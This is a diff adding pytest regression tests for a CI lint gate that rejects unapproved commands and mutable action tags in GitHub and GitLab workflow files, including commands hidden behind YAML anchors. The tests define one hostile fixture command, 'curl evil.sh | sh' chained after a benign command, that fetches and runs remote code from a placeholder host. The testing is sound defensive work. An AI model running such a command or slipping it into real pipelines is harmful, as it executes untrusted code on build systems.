@@ -335,3 +335,131 @@ def test_bundle_proceeds_when_the_stamp_matches(tmp_path):
         "trivy.json",
         f"vcows-deploy-9.9.9.9-{ARCHIVE_REVISION}.tar.gz",
     ]
+
+
+# --- scripts/lint.sh: workflows carry no logic ------------------------------
+#
+# `#82` was a defect in this gate's own walk, and it failed silently: a YAML
+# sequence alias splices a *list* into a list, so `- *bootstrap` under `script:`
+# parses to `[[...three commands...], "just check"]`. The pre-`#82` `lines()`
+# matched only `isinstance(item, str)` and dropped the whole anchor with no
+# diagnostic -- the shape all four `.gitlab-ci.yml` jobs use. The gate was blind
+# to hostile content in every anchored job and said nothing.
+#
+# It has been covered by nothing since. `docs/review-workflow-gate/REVIEW.md:262`
+# and `:296` record the test being offered twice and declined as surface, with
+# the consequence written down instead: "a future edit to `lines()` has no
+# automated guard". This is that guard.
+
+#: A command the allowlist at `lint.sh:54` must reject. Written as a chain
+#: because that is the case `lint.sh:49-53` gives for `fullmatch` over `match`:
+#: a prefix test passes `just check && curl evil.sh | sh`.
+HOSTILE = "just check && curl evil.sh | sh"
+
+#: The gate's own line in `lint.sh`'s summary. It accumulates rather than
+#: &&-chains (`lint.sh:7-11`), so this line is present whatever the other five
+#: gates did.
+VERDICT = "workflows carry no logic"
+
+
+def _workflow_tree(tmp_path: Path, *, github: dict[str, str], gitlab: str = "") -> Path:
+    """A scratch repo whose only interesting content is its workflow files.
+
+    `lint.sh` is copied rather than run in place for the reason the module
+    docstring gives: `REPO` is derived from `BASH_SOURCE` and `readonly`, so
+    relocating the script is the only way to point the gate at workflows a test
+    controls.
+
+    `.venv` is a symlink rather than a build. `lint.sh:128` calls `need_venv`
+    and the gate's body runs under `$PY` (`lib.sh:39`), which needs PyYAML;
+    creating a second venv per test would cost more than the whole file. The
+    link is read, never written -- every path these tests write is under
+    `tmp_path`.
+    """
+    tree = _tree(tmp_path, "lint.sh")
+    (tree / ".venv").symlink_to(ROOT / ".venv")
+    workflows = tree / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    for name, text in github.items():
+        (workflows / name).write_text(text)
+    if gitlab:
+        (tree / ".gitlab-ci.yml").write_text(gitlab)
+    return tree
+
+
+def _gate_verdict(tree: Path) -> tuple[bool, str]:
+    """Run every gate, report only this one's verdict and its diagnostic.
+
+    Read the summary line, never `lint.sh`'s exit status. Five other gates run
+    against a tree that is not a checkout -- `shellcheck` is handed the
+    unexpanded `$REPO/.claude/hooks/*.sh` glob and fails on it -- so the script
+    exits non-zero here no matter what the workflows gate decided. Asserting on
+    the status would pass for the wrong reason in both directions.
+    """
+    done = _run(tree, "bash scripts/lint.sh")
+    for line in done.stdout.splitlines():
+        if VERDICT in line:
+            return line.strip().startswith("ok"), done.stderr
+    raise AssertionError(f"no {VERDICT!r} verdict in:\n{done.stdout}\n{done.stderr}")
+
+
+#: `(id, github files, gitlab file, must_pass)`. Every hostile shape is paired
+#: with the benign twin of the same shape, so a case cannot pass because the
+#: fixture never reached the gate.
+#:
+#: The GitLab documents are written as anchors because that is `#82`'s shape and
+#: because a `.gitlab-ci.yml` that does not use one exercises nothing this file
+#: is here for.
+_ANCHORED = """\
+.bootstrap: &bootstrap
+  - ./scripts/os-deps.sh
+  - %s
+check:
+  script: [*bootstrap, just check]
+"""
+_RUN = "a:\n  steps: [{run: %s}]\n"
+_USES = "a:\n  steps: [{uses: %s}]\n"
+_SCRIPT = "a:\n  script: %s\n"
+_MINIMAL = _RUN % "just check"
+_DIGEST = "actions/checkout@" + "a" * 40
+
+GATE_ROWS = [
+    # The `#82` shape: a list spliced into a list under `script:`.
+    ("anchored-list", {"ci.yml": _MINIMAL}, _ANCHORED % HOSTILE, False),
+    ("anchored-list-benign", {"ci.yml": _MINIMAL}, _ANCHORED % "just dev-env", True),
+    # A plain string under `run:`, which the walk has always reached. This is
+    # the `fullmatch`-not-`match` property: the chain starts with `just check`.
+    ("bare-string", {"ci.yml": _RUN % HOSTILE}, "", False),
+    ("bare-string-benign", {"ci.yml": _MINIMAL}, "", True),
+    # A list inside a list, reached only by `lines()` recursing on itself.
+    ("nested-list", {"ci.yml": _MINIMAL}, _SCRIPT % f"[[{HOSTILE}]]", False),
+    ("nested-list-benign", {"ci.yml": _MINIMAL}, _SCRIPT % "[[just check]]", True),
+    # `uses:`, the second allowlist. A tag ref is what the pin exists to refuse.
+    ("mutable-tag", {"ci.yml": _USES % "actions/checkout@v7"}, "", False),
+    ("digest-pin", {"ci.yml": _USES % _DIGEST}, "", True),
+    # `lint.sh:101-103`: reading only one extension "fails open on a file it was
+    # written to cover". The file discovery is the gate's, not YAML's.
+    ("yaml-extension", {"ci.yaml": _RUN % HOSTILE}, "", False),
+]
+
+
+@pytest.mark.parametrize(
+    ("github", "gitlab", "must_pass"),
+    [row[1:] for row in GATE_ROWS],
+    ids=[row[0] for row in GATE_ROWS],
+)
+def test_the_workflow_gate_reaches_every_shape_a_command_can_take(
+    tmp_path, github, gitlab, must_pass
+):
+    """`lint.sh:40-124` against one hostile command written nine ways.
+
+    The failing rows assert the diagnostic *names* the command as well. A gate
+    that fails without saying which line it objected to is the half of `#82`
+    that made it survive: the walk returned nothing and the gate reported
+    nothing, and both readings of that silence look identical from outside.
+    """
+    tree = _workflow_tree(tmp_path, github=github, gitlab=gitlab)
+    passed, stderr = _gate_verdict(tree)
+    assert passed is must_pass, stderr
+    if not must_pass:
+        assert HOSTILE in stderr or "actions/checkout@v7" in stderr, stderr
